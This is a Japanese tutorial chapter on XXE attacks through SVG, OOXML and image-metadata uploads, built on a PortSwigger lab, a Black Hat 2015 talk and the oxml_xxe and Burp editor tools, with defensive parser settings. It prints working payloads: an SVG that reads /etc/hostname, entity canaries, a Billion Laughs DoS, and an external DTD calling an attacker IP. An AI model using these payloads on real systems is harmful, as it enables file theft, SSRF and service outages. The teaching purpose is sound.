# 第4章 XMLを解釈する各種ファイル形式経由のXXE


## SVG画像アップロード経由XXEのラボ

XXE（XML External Entity injection、XML外部実体注入）は、しばしば「XMLを受け取るAPIエンドポイント」だけの問題だと誤解される。しかし実際には、**表向きは画像やドキュメントに見えるが内部はXMLで表現されているファイル形式**を経由して発火することが多い。本節では、その最も典型的で実務でも遭遇頻度の高いケースである「SVG画像のアップロード経由XXE」を、PortSwiggerのラボ「Exploiting XXE via image file upload」を題材に、仕組みのレベルまで掘り下げて解説する。

ここで扱う攻撃は**あくまで防御・検証設計を理解するための学習用ラボ環境（PortSwigger Web Security Academyが提供する使い捨てインスタンス）に限定**する。実在サービスや本番環境に対して無許可でこのペイロードを投げてはならない。

### なぜ「画像アップロード」がXXEの入口になるのか

多くの開発者は「アップロード機能で気をつけるべきはXSSや悪意ある実行ファイル」だと考える。ところが画像フォーマットの一つ **SVG（Scalable Vector Graphics）は、その中身が完全にXMLで書かれたテキストファイル**である。拡張子は`.svg`でも、実体は次のようなXML文書だ。

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <circle cx="64" cy="64" r="60" fill="red"/>
</svg>
```

サーバがアップロードされたアバター画像を「サムネイル化する」「PNGに変換する」といった処理を行うとき、SVGを受け付ける実装ではこのXMLを**XMLパーサ（XMLを構文解析してツリー構造に変換するライブラリ）に通す**。ここが落とし穴になる。XMLの仕様には「外部実体（external entity）」という機能があり、パーサがデフォルトで有効にしていると、XML文書の中から**サーバのローカルファイルやネットワーク上のURLを読み込ませることができてしまう**。つまり、画像処理という無害に見える操作の裏で、攻撃者が指定したファイルをパーサが開いてくれるのだ。

用語を整理しておく。

- **実体（entity）**: XMLにおける「変数」や「マクロ」のようなもの。`&xxe;`のように参照すると、定義された値に展開される。
- **外部実体（external entity）**: 実体の値を、文書内ではなく外部リソース（`file:///...`や`http://...`）から取ってくる形式。`<!ENTITY xxe SYSTEM "file:///etc/hostname">`のように`SYSTEM`キーワードで宣言する。
- **DOCTYPE / DTD**: 文書型定義。`<!DOCTYPE ...>`の中で実体を宣言する。ここがXXEの「宣言場所」になる。
- **sink（シンク）**: 攻撃者が注入した入力が、最終的に危険な形で解釈・実行される到達先。SVG XXEでは「XMLパーサの外部実体解決処理」がsinkにあたる。

### ラボの構成 — Apache Batikによるアバター処理

このPortSwiggerラボは、ブログのコメント機能に**アバター画像を添付できる**仕組みを持つ。サーバ側はアップロードされた画像を **Apache Batik ライブラリで処理**している。Batikは Apache XML Graphics プロジェクトの一部で、SVGを解釈してPNGやJPEGにラスタライズ（画素画像化）したり表示したりするためのJavaライブラリである。

ラボのゴールは明確で、「**サーバ上の `/etc/hostname` ファイルの中身を表示する画像をアップロードせよ**」というものだ。`/etc/hostname`はLinuxでホスト名を保持する短いテキストファイルで、「ファイルの中身を外部に漏らせた」ことの証明として使われる（実攻撃なら`/etc/passwd`やクラウドのメタデータなどが標的になりうるが、ラボは無害な証明用ファイルを指定している）。

Batikが危険なのは歴史的な経緯がある。**CVE-2015-0250**として知られる脆弱性で、Apache Batikの**バージョン1.0から1.7まで**は、SVG（=XML）を解析する際に**外部実体の評価をデフォルトで有効**にしていた。そのため、悪意あるSVGをトランスコード（PNG/JPGへの変換）させると、外部実体経由でローカルファイル読み取りやSSRF（サーバ側リクエスト強制）が可能だった。修正版の**バージョン1.8**で、XML解析時の外部実体評価が無効化された。PortSwiggerのラボは、この脆弱なバージョン相当の挙動を再現している。

> 出典: Lab: Exploiting XXE via image file upload — https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
> 出典: XML External Entity (XXE) Injection in Apache Batik Library [CVE-2015-0250] — https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/

### 攻撃ペイロード — ファイルの中身を「文字」として描画させる

このラボで使う核心のSVGペイロードは次の通りである（PortSwigger公式が提示する実物）。

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

このファイルをローカルで作成し、ブログ記事にコメントを投稿する際に**アバター画像としてアップロード**する。自分のコメントを表示すると、アバター画像の中に **`/etc/hostname` の中身（ホスト名文字列）が文字として描かれて見える**。その値をラボの回答欄に提出すればクリアとなる。

> 出典: 11.8 Lab: Exploiting XXE via image file upload | 2024 (Karthikeyan Nagaraj) — https://cyberw1ng.medium.com/11-8-lab-exploiting-xxe-via-image-file-upload-2024-e2840c3b85f3

> ⚠️ **未取得の資料**: 「11.8 Lab: Exploiting XXE via image file upload（Karthikeyan Nagaraj / Medium）」は自動取得できませんでした（理由: MediumがHTTP 403でボット取得を拒否）。以下のURLからご自身で直接ご覧ください: https://medium.com/infosecmatrix/11-8-lab-exploiting-xxe-via-image-file-upload-2024-e2840c3b85f3 （ミラー: https://cyberw1ng.medium.com/11-8-lab-exploiting-xxe-via-image-file-upload-2024-e2840c3b85f3 ）
>
> （以下は未取得資料の補足として一般知識に基づく解説です）この種のwriteupが強調する要点は3つに集約される。(1) SVGは拡張子・MIMEタイプが「画像」でも中身はXMLであること、(2) アバターアップロード機能が古いApache Batikを内部で使っておりXXEが刺さること、(3) 読み取ったファイル内容を`<text>`要素で「描画」させることで、レスポンスに直接テキストが返らなくても画像として目視回収できること。上のWebSearchで確認できた同ラボのペイロードと手順は、PortSwigger公式のものと一字一句同一である。

### なぜこれが動くのか — 仕組みをパーサのレベルで理解する

このペイロードが成立する理由を、XMLパーサの内部挙動に沿って分解する。ここが本節の核心である。

#### 1. `standalone="yes"` と外部DTDサブセット

XML宣言の`standalone="yes"`は「この文書は外部のマークアップ宣言に依存しない」という意味だが、**文書内（内部DTDサブセット）で宣言した外部実体は依然として処理される**。ペイロードは外部のDTDファイルを取りに行かず、`<!DOCTYPE test [ ... ]>`の角括弧の中、つまり**内部サブセット**に実体を宣言している。これによって「外部DTDの取得はしないが、実体の値の解決だけはローカルファイルに対して行う」という状態が作れる。パーサから見れば、宣言そのものは文書内で完結しているため`standalone`と矛盾せず、素直に処理が進む。

#### 2. 外部実体の宣言と解決

```xml
<!ENTITY xxe SYSTEM "file:///etc/hostname" >
```

この一行が心臓部だ。`SYSTEM`キーワードは「この実体の値は、続くシステム識別子（ここではURI `file:///etc/hostname`）が指すリソースの中身である」とパーサに指示する。XMLパーサが外部一般実体をサポートし、かつ外部実体解決を有効にしていると、パーサは`&xxe;`が参照された時点で **`file://`スキームのURIを解決＝OSに対して当該ファイルを開いて読み込む**。`file:///etc/hostname`の3連スラッシュは「ホスト部が空（=ローカルホスト）＋絶対パス`/etc/hostname`」を表す標準的なfile URIの書き方である。

Batik（1.7以前）は内部でSAXベースのXMLパーサを用いてSVGを読むが、**外部実体解決を抑止する設定（後述のセキュア設定）を行っていなかった**ため、この`file://`参照がそのまま実行された。これがCVE-2015-0250の本質である。

#### 3. 読み取った中身を「描画」に流し込む

```xml
<text font-size="16" x="0" y="16">&xxe;</text>
```

外部実体を宣言しただけではファイルは画面に出ない。SVGの`<text>`要素の**文字データとして`&xxe;`を参照**することで、パーサは実体を`/etc/hostname`の中身に展開し、その文字列がSVGテキストノードの内容になる。Batikがこのツリーをラスタライズすると、**ファイルの中身がそのまま画像上の文字として描画された**PNG/表示結果が生成される。

この「描画に流し込む」という一手が重要だ。XXEには大きく分けて2種類ある。

- **in-band（帯域内）XXE**: 読み取ったデータがそのままレスポンス本文に現れるタイプ。
- **out-of-band（帯域外, OOB）XXE**: レスポンスには出ず、攻撃者サーバへのDNS/HTTPリクエストなどで間接的に回収するタイプ。

SVGアバターの場合、レスポンスはHTMLではなく**生成された画像**である。だが`<text>`で描画させることで、実質的に**画像というチャネルを使ったin-band回収**が成立する。テキストとして返ってこなくても「目で読める画像」として漏洩させられる点が、この攻撃の巧妙さだ。

#### 4. なぜ改行を含むファイルだと途切れるのか（実務Tips）

`/etc/hostname`はほぼ1行なので綺麗に描画されるが、`/etc/passwd`のような複数行ファイルを狙うと、SVGの単一`<text>`要素は改行を折り返さないため**最初の1行しか見えない**ことが多い。実攻撃・実検証（許可された範囲での）では、この制約を回避するために、読み取り結果を攻撃者サーバへ送り出す**out-of-bandパラメータ実体**を組み合わせるか、Batikが`http://`スキームも解決することを利用してSSRFに転じる。ただし本ラボのゴールは1行の`/etc/hostname`表示なので、上記の単純なペイロードで十分である。

### 攻略の流れ（ラボ環境内・要点のみ）

本テキストは「ラボの手取り足取りの攻略」を目的としないため、仕組み理解に必要な流れだけを示す。

1. 上記ペイロードを`exploit.svg`としてローカルに保存する。
2. ラボのブログ記事を開き、コメントフォームでアバター画像として`exploit.svg`をアップロードして投稿する。
3. 投稿後、自分のコメントのアバター表示を確認すると、`/etc/hostname`の中身が画像内テキストとして現れる。
4. その値をラボの回答欄に入力する。

ポイントは、**「アップロードされた画像を後段でサーバ側処理（変換・レンダリング）にかける機能」があること**が前提条件である点だ。単にファイルを保存してそのまま`<img>`で配信するだけの実装なら、XMLパーサが動かないためこのXXEは発火しない（ただしその場合はSVG内`<script>`によるstored XSSという別リスクが残る）。

### 防御 — 設計側でどう塞ぐか

防御目的の観点から、SVGアップロード経由XXEを止める手立てを、効果の高い順に整理する。

#### 1. XMLパーサで外部実体・DTDを無効化する（最重要・根本対策）

XXE全般の王道対策は、XMLを解析するライブラリで**DTD処理と外部実体解決を明示的に無効化**することだ。Apache Batikであればセキュアなドキュメントファクトリやパーサのフィーチャ設定を用いる。Javaの一般的なSAX/DOMパーサなら次のように設定する。

```java
// 外部一般実体・パラメータ実体・DTDを無効化する典型例
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

`disallow-doctype-decl`を`true`にすると`<!DOCTYPE>`自体が禁止され、実体宣言の余地がなくなる。これがもっとも堅い。**なぜ効くか**: XXEは「パーサが外部URIを解決する」ことで初めて成立するため、その解決経路を根本から断てば、たとえ悪意あるSVGが届いてもファイルは一切読まれない。

#### 2. Apache Batikを1.8以降に更新する

前述の通り、Batikは**1.8**でXML解析時の外部実体評価を無効化する修正が入った。**1.7以前を使い続けないこと**が単純かつ確実な緩和策である。依存ライブラリのバージョンを棚卸しし、SVGを扱う経路で古いBatikが残っていないかを確認する。

#### 3. SVGを画像として扱わない／ラスタライズ前に無害化する

- アップロード可能な画像形式のホワイトリストから**SVGを外す**（PNG/JPEG/GIFのみ許可）。多くのアプリでアバターにSVGを許す必然性はない。
- SVGを許容せざるを得ない場合は、DOMPurify（サーバサイドSVGモード）などの**SVGサニタイザ**でDTD・`<script>`・外部参照を除去してから保存・レンダリングする。
- MIMEタイプや拡張子だけを信用しない。中身が`<?xml`や`<!DOCTYPE`で始まるファイルは画像処理系に渡さない、という入口検査も併用する。

#### 4. 多層防御 — 出口側の締め付け

XMLパーサ設定が万一漏れても被害を抑えるため、サーバの実行ユーザ権限を最小化し、機微ファイルへの読み取り権限を絞る。さらに送信（egress）方向のネットワークを制限すれば、`http://`スキームを使ったSSRF型XXEやOOB流出も難しくなる。ただしこれらは**補助**であり、根本対策は上記1と2である。

### まとめ

- SVGは拡張子・MIMEが「画像」でも**中身はXML**であり、サーバがそれを**XMLパーサ経由でレンダリング**するとXXEのsinkになる。
- PortSwiggerラボでは、脆弱な**Apache Batik（1.7以前相当、CVE-2015-0250）**がアバターSVGを処理する。`<!ENTITY xxe SYSTEM "file:///etc/hostname">`で外部実体を宣言し、`<text>&xxe;</text>`で**ファイル内容を画像に描画**して回収する。
- 動作原理は、(1) 内部DTDサブセットでの外部実体宣言、(2) パーサによる`file://`URIの解決、(3) 描画チャネルを使ったin-band回収、の3段構え。
- 根本防御は**XMLパーサでのDTD/外部実体の無効化**と**Batik 1.8以降への更新**、加えて**SVGを画像として受け付けない／サニタイズする**入口対策である。

> 出典: Lab: Exploiting XXE via image file upload — https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
> 出典: XML External Entity (XXE) Injection in Apache Batik Library [CVE-2015-0250] — https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/
> 出典: 11.8 Lab: Exploiting XXE via image file upload | 2024 (Karthikeyan Nagaraj) — https://cyberw1ng.medium.com/11-8-lab-exploiting-xxe-via-image-file-upload-2024-e2840c3b85f3

## OOXML埋込ツールとBlack Hat原典

XXE（XML External Entity、XML外部実体参照）といえば「XMLを受け取るAPIエンドポイントに悪意ある`<!DOCTYPE>`を送り込む」攻撃を最初に思い浮かべる読者が多いだろう。しかしこの章の主題は、**ユーザーがアップロードした「ファイル」の内部でXMLが解釈される経路**である。DOCXやXLSXのようなオフィス文書、SVG、さらにはJPG/GIF/PDFといった画像・文書フォーマットは、その内部にXMLを抱えている。アプリケーションがそのXMLをサーバ側でパース（構文解析）する瞬間に、そのファイルは丸ごとXXEペイロードの運搬体になりうる。

この経路を体系化し、テストを自動化したのが Will Vandevanter（`@_will_is_`）による **oxml_xxe** ツールと、その発表元である **Black Hat USA 2015** の講演「Exploiting XXE in File Upload Functionality（ファイルアップロード機能におけるXXEの悪用）」である。本節はこの2つを原典として、なぜファイル埋込型XXEが成立するのか、その仕組みレベルの原理を解説する。

### OOXMLとは何か — ファイルの正体はZIP+XML

まず対象フォーマットの内部構造を理解する必要がある。DOCX・PPTX・XLSXが属する **OOXML（Office Open XML、別名 OpenXML / OXML）** は、Microsoftが策定した「開いた」文書フォーマットで、Office 2007以降の既定形式である（Office 2003からも利用可能）。

重要なのは、OOXMLファイルの**実体はZIPアーカイブ**だという点だ。`report.docx`の拡張子を`.zip`に変えて展開すると、複数のXMLファイルとメディア（画像など）が現れる。つまりDOCXは「複数のXML文書を圧縮して1ファイルに束ねたもの」にすぎない。この事実こそが攻撃面（attack surface、攻撃者が触れる入口の広がり）を生む。**アプリがDOCXを処理する = 内部の複数XMLをパースする**、ということだからだ。

Vandevanterのスライドは、OOXMLを解釈するライブラリが辿る**パース順序**を次のように示す。

```
1. /_rels/.rels          … 文書全体の関係(relationship)定義
2. [Content_Types].xml   … 各パーツのMIMEタイプ宣言
3. Default Main Document Part（本体）
     DOCX → /word/document.xml
     PPTX → /ppt/presentation.xml
     XLSX → /xl/workbook.xml
```

パーサはまず`/_rels/.rels`と`[Content_Types].xml`という「メタデータ的なXML」を読み、そこから本体パーツ（`document.xml`等）へ辿る。**つまりXXEの注入先は本体だけではない**。`[Content_Types].xml`や`.rels`も立派なXMLであり、多くのパーサが最初に無条件で読む。防御側がうっかり本体`document.xml`だけをサニタイズしても、先に読まれる`[Content_Types].xml`が素通しなら攻撃は成立する。実際、講演で紹介されたSlackのファイル共有機能のバグは`[Content_Types].xml`の改変で成立した。

> 出典: Exploiting XXE in File Upload Functionality（Will Vandevanter, Black Hat USA 2015 スライド）— https://oxmlxxe.github.io/reveal.js/slides.html

### 最小のXXE — 実体（Entity）の注入

最も基本的な注入は、本体XMLの先頭に**内部DTD（Document Type Definition、文書型定義）**を差し込み、実体（entity、XML内で使える名前付きの置換文字列）を定義することだ。原典のデモはこう始まる。

```xml
<!DOCTYPE root [
  <!ENTITY post "1">
]>
```

これを例えば`/word/document.xml`の冒頭に埋め、本文中で`&post;`と参照すると、パーサはそれを`1`に展開する。ここで「実体が実際に展開されたか（＝DTDと実体参照が有効か）」を確かめる工程を、Vandevanterは **canary testing（カナリアテスト＝毒ガス検知のカナリアのように、危険な機能が生きているかを無害な値で先に探る手法）** と呼ぶ。まず無害な文字列が展開されることを確認し、有効なら次段の外部参照（ファイル読み取りやSSRF）へ進む、という段階的アプローチだ。無闇に致命的なペイロードを送らず、まず反応の有無を見るのは本番非破壊のテスト設計としても理にかなう。

#### 関係ファイルを使ったカナリア

Vandevanterは`.rels`ファイルを使った巧妙なカナリアも示す。`/_rels/.rels`内の`Relationship`要素の`Target`属性（本来は`/word/document.xml`のようなパスを指す）を、実体参照に置き換える。

```xml
<!DOCTYPE root [
  <!ENTITY canary "/word/document.xml">
]>
...
<Relationship Id="rId1"
  Type="...relationships/officeDocument"
  Target="&canary;" />
```

`&canary;`が展開されて元のパスと同じ値になれば、`.rels`がXXE可能なパーサで処理されている証拠になる。**属性値の位置で実体展開が起きるか**を確認できる点がポイントで、CDATA・平文・属性という展開文脈ごとにパーサの挙動が異なるため、XSSやLFIへ発展させる前の下調べに使える。

### 再帰的実体 — Billion Laughs（DoS）

外部通信を一切せずにサービスを停止させる古典が、**再帰的実体展開**による「Billion Laughs（10億の笑い）」攻撃だ。原典のペイロードは次の通り。

```xml
<!DOCTYPE foo [
  <!ENTITY post "1">
  <!ENTITY post1 "&post;&post;">
  <!ENTITY post2 "&post1;&post1;">
  <!ENTITY post3 "&post2;&post2;">
  <!ENTITY post4 "&post3;&post3;">
  <!ENTITY post5 "&post4;&post4;">
]>
<foo>&post5;</foo>
```

**なぜ危険か**：各実体が下位の実体を2回ずつ参照するため、展開量は段ごとに2倍になる。5段で2^5=32だが、原典では例示のため5段に留めているだけで、段数を増やせば`&postN;`は2^N文字へ指数関数的に膨張する。数KBのファイルがメモリ上で数GBに展開され、XMLパーサがメモリを食い潰してプロセスが停止する。ネットワーク接続を必要とせず、パーサの「実体を律儀に全部展開する」という仕様そのものを悪用する点が本質だ。

このDoSはパーサ実装の脆弱性として複数のCVEに結びついている。原典が挙げるのは以下（対象・年・状況を明記する）。

- **Apache POI**（Javaのオフィス文書ライブラリ）: `CVE-2014-3574`, `CVE-2014-3529` — いずれも2014年公開、XML実体展開に起因。修正版あり。
- **docx4j**（Java）, **OpenXML SDK**（.NET）: 同種の実体展開問題。
- **Nokogiri**（Ruby/libxml2ラッパー）: `CVE-2012-6685`（相当）, `CVE-2014-3660` — 外部実体・DTDの扱いに起因。

> 出典: Exploiting XXE in File Upload Functionality（Black Hat USA 2015 スライド）— https://blackhat.com/docs/us-15/materials/us-15-Vandevanter-Exploiting-XXE-Vulnerabilities-In-File-Parsing-Functionality.pdf

### さらなる悪用 — LFI・SSRF・多形式展開

原典後半の「Further Exploitation」は、ファイル埋込XXEの発展形を整理する。カナリアで実体が生きていると分かったら、次の3方向へ展開できる。

#### 1. Webアプリ側での二次被害（XSS / LFI）

展開された実体の値がそのまま画面に反映されれば **XSS**（保存型になりやすい。文書処理結果としてサーバに保存され後で表示されるため）、`SYSTEM`実体で`file:///etc/passwd`等を読めば **LFI（Local File Inclusion、ローカルファイル読み取り）** になる。CDATA・平文・属性という展開文脈ごとにペイロードを調整する必要がある。

#### 2. アウトバウンド接続（SSRF）

外部**PUBLIC DTD**を宣言すると、パーサがそのURLへHTTP取得を試みる。原典の実物はこれだ。

```xml
<!DOCTYPE foo PUBLIC "-//B/A/EN" "http://[IP]">
```

**なぜ通信が起きるか**：`PUBLIC`宣言の第2引数はDTDの「システム識別子」＝取得先URLであり、外部DTD読み込みを許すパーサは律儀にそのURLを取りに行く。攻撃者サーバのIPを指定すれば、標的サーバから攻撃者へアウトバウンド接続が飛ぶ。これは (a) 実体展開結果を直接返さない**ブラインドXXE**でも「通信が来たか」で成否を判定できるカナリアになり、(b) 内部ネットワークへ向ければ **SSRF（Server-Side Request Forgery、サーバに内部宛リクエストを代行させる攻撃）** そのものになる。スライドはこれを`externalTarget`として整理している。

> ⚠️ **未取得の資料**: Black Hat USA 2015 スライドPDF「Exploiting XXE in File Parsing Functionality」は、当初WebFetchでは本文がバイナリ（PDF）として返り直接抽出できませんでした。ただし本節では、ダウンロード済みPDFをローカルでテキスト抽出し、原典スライドの文言（上記ペイロード・CVE番号・パース順序を含む）を直接引用しています。原文スライドはこちらから直接ご覧ください: https://blackhat.com/docs/us-15/materials/us-15-Vandevanter-Exploiting-XXE-Vulnerabilities-In-File-Parsing-Functionality.pdf

#### 3. 別ファイル形式への展開 — PDF / 画像

原典は「XXE in Other File Formats」として、XMLを内部に持つ他フォーマットも列挙する。特に **PDF** は `AR7`（Acrobat系機能）・**XFA**（XML Forms Architecture、PDFフォームをXMLで記述する仕様）・**XMP**（後述）といったXMLベースの構成要素を持ち、そこにXXEを仕込める。

### oxml_xxe ツール — 埋込を自動化する

以上のテストを手作業でやると、ZIPを解いてXMLを書き換え再圧縮…という煩雑な手順を全形式ぶん繰り返すことになる。これを1画面で自動化するのが **BuffaloWill/oxml_xxe** である。GitHubの説明文は端的で、「**A tool for embedding XXE/XML exploits into different filetypes（XXE/XMLエクスプロイトを各種ファイル形式に埋め込むツール）**」とある。

- **対応形式**: DOCX / XLSX / PPTX、ODT / ODG / ODP / ODS（OpenDocument、LibreOffice等の形式）、SVG、生XML、そして **PDF・JPG・GIF**。
- **実装**: Ruby製。Webフレームワーク Sinatra、UIに Bootstrap、テンプレートに Slim を使う。ブラウザで`http://localhost:4567/`を開いて操作する。
- **ペイロード管理**: `payloads.yaml` にXXEペイロード群を定義しておき、GUIから対象ファイルへ選んで注入する。ペイロードを追加・改変したいときはこのYAMLを編集する。

導入は次のいずれか（対象は2024年時点のREADME、Ruby 3.2系依存）。

```bash
# Docker
docker build --tag oxml_xxe .
docker run --name oxml_xxe -p 4567:4567 --rm oxml_xxe

# Ubuntu 手動（依存: libxml2-dev, libxslt-dev, zlib1g-dev, gcc, ruby3.2 等）
gem install bundler && bundle install && ruby server.rb
```

#### 画像フォーマットへの埋込 — XMPという抜け道

「なぜJPGやGIFにXMLを埋められるのか」は、この節で最も原理的に面白い部分だ。鍵は **XMP（Extensible Metadata Platform、Adobe策定のメタデータ規格）** である。XMPは撮影日時や著作権などのメタデータを**XMLで**表現し、JPEG・GIF・PDFなどのファイル内に埋め込む。oxml_xxeはこのXMPメタデータ領域にXXEペイロードを差し込む。

したがって、アプリが「アップロードされた画像のEXIF/XMPメタデータを読む」処理でXMLパーサを使っていれば、`profile.jpg`という一見無害な画像がXXEの運搬体になる。フォーマットが画像だからといってXMLパースと無縁とは限らない、というのが要点だ。関連する著名事例として、oxml_xxeのドキュメントは画像処理系のXXEである `CVE-2016-4264`（ImageMagickのXXE）にも言及している。

> 出典: BuffaloWill/oxml_xxe — https://github.com/BuffaloWill/oxml_xxe

#### 補足: SVGにおけるXXE

SVG（Scalable Vector Graphics）は名前通り**XMLそのもの**で書かれた画像形式だ。ゆえに`<svg>`要素の前に`<!DOCTYPE>`を置くだけでXXEが成立する。アバターやアイコンのアップロードをSVGで受け付け、サーバ側でサムネイル生成やラスタライズのためにSVGをXMLとして解析すると、そこがsink（入力が最終的に実行・解釈される危険な代入先）になる。oxml_xxeがSVGを1形式として扱うのはこのためだ。

### 現実の被害事例

原典が「Bug Bounty」の実例として挙げるのは次の2件で、いずれも「XMLを受け付けるつもりのないアップロード機能」が入口になった点が教訓だ。

- **Slack**: ファイル共有機能で`[Content_Types].xml`の改変により成立。
- **Facebook Careers（採用ページ）の履歴書アップロード**: 2014年Q4、研究者 Mohamed Ramadan による報告。アップロードされたレジュメ（DOCX等）をサーバが解析する経路が突かれた。

### 防御 — なぜ「同じパーサだと思い込む」のが危険か

Vandevanterの結論スライド（Summary Points）は、防御側への最重要メッセージを一言で述べている。

> **サイトのある部分（例: API）でXMLをパースするライブラリと、アップロードファイルをパースするライブラリは同一とは限らない。必ず検証し、設定を確認せよ。**

これが核心だ。多くのチームはAPIの入口だけXXE対策（外部実体・DTD無効化）を施し、「うちのXMLパーサは安全」と思い込む。しかしファイルアップロードの裏側では、Apache POI・docx4j・Nokogiri・ImageMagickといった**別のライブラリが別の設定で**動いており、そこにDTD・外部実体を無効化する設定が入っていないことがある。防御の実務としては次を徹底する。

1. **全経路の棚卸し**: XMLを触りうる全処理（API、ファイル解析、画像メタデータ抽出、SVGラスタライズ）を洗い出し、それぞれで使うパーサとその設定を確認する。
2. **DTD・外部実体の無効化**: 各パーサで外部一般実体・外部パラメータ実体・外部DTD読み込み・`DOCTYPE`自体を無効化する（例: Javaなら`disallow-doctype-decl`を`true`に、`external-general-entities`を`false`に）。
3. **パッチ適用**: 上記CVE群の修正は既に提供済み。オフィス文書・画像処理ライブラリを最新に保つ。
4. **アウトバウンド遮断**: パースを行うサーバから外部への不要な送信をネットワーク側でも遮断し、SSRF/ブラインドXXEの成立条件を潰す。

原典が2015年に鳴らした警鐘は、対策設定が各パーサに標準化されつつある現在でも古びていない。**「ファイル＝ただのデータ」ではなく「ファイル＝実行されうるXMLの束」**という視点を持てるかどうかが、この攻撃面を塞げるかの分かれ目になる。

> 出典: Exploiting XXE in File Upload Functionality（Will Vandevanter, Black Hat USA 2015）公式ページ — http://oxmlxxe.github.io / スライド — https://oxmlxxe.github.io/reveal.js/slides.html

---

**本節のスコープに関する注記**: 本節は防御・検証を目的とした技術解説であり、掲載したペイロード・ツールは自組織の管理下または明示的な許可を得た検証環境でのみ用いること。実在サービスや本番環境への無許可の検証、破壊的手順の実行は行わない。

## OOXML編集ツール（Burp拡張・生成器）

前節までで、DOCX・XLSX・PPTXといったOOXML（Office Open XML）ファイルの実体が「複数のXMLファイルをZIPアーカイブとして束ねたコンテナ形式」であり、その中の`word/document.xml`や`xl/sharedStrings.xml`、`[Content_Types].xml`などに手を加えることでXXE（XML External Entity, XML外部実体注入）ペイロードを埋め込めることを確認した。しかし、この仕組みを知っていても、実際の検証作業は「ZIPを展開する→対象XMLを編集する→再圧縮する→アップロードする→レスポンスを確認する→ペイロードを変えてまた最初から」という反復作業になりがちで、手作業では非効率かつミスも起きやすい。本節では、この反復作業を支援するために作られた2つのツール、Burp Suite拡張の**Office Open XML Editor**と、ペイロード付きファイルを生成するスクリプト**officeXXE**を取り上げ、それぞれの仕組みと、防御側がこれらのツールの挙動から何を学ぶべきかを解説する。

### なぜ「編集ツール」が必要になるのか：OOXMLの構造的な制約

まず前提を整理する。OOXMLファイルは中身がZIPアーカイブであるため、そのままではテキストエディタで開いて編集できない。プロキシツール（Burp SuiteやOWASP ZAPなど、ブラウザとサーバの間に立ってHTTPリクエスト/レスポンスを閲覧・改ざんする中間者的ツール）は本来、テキストベースのHTTPボディを対象に作られており、バイナリであるZIP（＝OOXML）のペイロードを直接いじる機能は持っていない。そのため、素朴にXXEを検証しようとすると次のような手順が必要になる。

1. Wordなどで空のdocxファイルを作成する
2. `unzip`コマンド等でZIPを展開する
3. `word/document.xml`をテキストエディタで開き、`<!DOCTYPE>`宣言とXXEペイロードを挿入する
4. 再度ZIPとして圧縮し直す（このとき圧縮方式やファイル構造を壊さないよう注意が必要）
5. できあがったファイルをアプリケーションにアップロードする
6. 結果を確認し、ペイロードを変えたい場合は手順2からやり直す

この「毎回ZIPを作り直す」という手間そのものが、ペイロードのバリエーションを素早く試すうえでの大きなボトルネックになる。Office Open XML EditorとofficeXXEは、それぞれ異なるアプローチでこのボトルネックを解消しようとしたツールである。

### Office Open XML Editor（PortSwigger Burp拡張）

#### 概要と位置づけ

Office Open XML Editorは、PortSwiggerが公開しているBurp Suite用の拡張機能（Extension）であり、Python 2.7で実装されている。公式リポジトリの説明では次のように紹介されている。

> "Office Open XML Editor is a burp extension written in Python 2.7 that will allow you to edit Office Open XML(OOXML) file directly in Burp Suite."

> 出典: PortSwigger/office-open-xml-editor — https://github.com/PortSwigger/office-open-xml-editor

この一文が示す本質は、「Burp Proxy/Repeaterの画面の中でOOXMLファイルを直接編集できるようにする」という点にある。前述の「展開→編集→再圧縮→送信」というサイクルを、Burpのタブ切り替えだけで完結させることを狙っている。

#### 動作の仕組み：CustomTabとマルチパート検出

Burp拡張には、Message Editor（リクエスト/レスポンスの表示・編集領域）に独自のタブを追加できるAPI（`IMessageEditorTabFactory`）が用意されている。本拡張はこのAPIを使い、次のロジックでタブを出現させる。

1. リクエストが**マルチパートPOSTリクエスト**（`multipart/form-data`形式で、ファイルアップロードなどに使われる複数パートを含むHTTPリクエスト）であるかを判定する
2. マルチパートの各パートのContent-Typeを調べ、設定ファイルに登録されたOOXML系のMIMEタイプと一致するかを確認する
3. 一致すれば、「Open Office XML」タブをMessage Editorに追加し、パート内のバイナリ（＝ZIPとしてのOOXMLファイル）をその場で展開してXMLをテキスト表示する
4. ユーザーがタブ内でXMLを編集して送信すると、拡張が裏側で該当XMLファイルをZIPに書き戻し、マルチパートのボディを差し替えてから実際のHTTPリクエストとして送出する

この「検出→展開→表示→編集→再圧縮→差し替え」という一連の処理をBurpの1リクエスト内で完結させている点が、本ツールの中核的な価値である。判定に使うMIMEタイプや、デフォルトで開くXMLファイル名は、リポジトリに含まれる設定ファイル`conf/conf.json`で管理されている。実際の内容は次の通りである。

```json
{
	"Content-Types": ["application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation"],
	"FileToOpen" : "[Content_Types].xml",
	"tryToFindZip" : true
}
```

> 出典: PortSwigger/office-open-xml-editor（conf/conf.json）— https://github.com/PortSwigger/office-open-xml-editor

この設定が示す仕組みをかみ砕くと以下の通りである。

- `Content-Types`配列は、Word（`wordprocessingml.document`＝docx）、Excel（`spreadsheetml.sheet`＝xlsx）、PowerPoint（`presentationml.presentation`＝pptx）に対応する公式MIMEタイプを列挙しており、リクエストのパートがこのいずれかに一致した場合にタブが有効化される。逆に言えば、アプリケーション側がこれら以外の独自Content-Type（例えば単に`application/octet-stream`）を使っている場合はそのままでは検出されず、`conf.json`を編集してMIMEタイプを追加する必要がある。
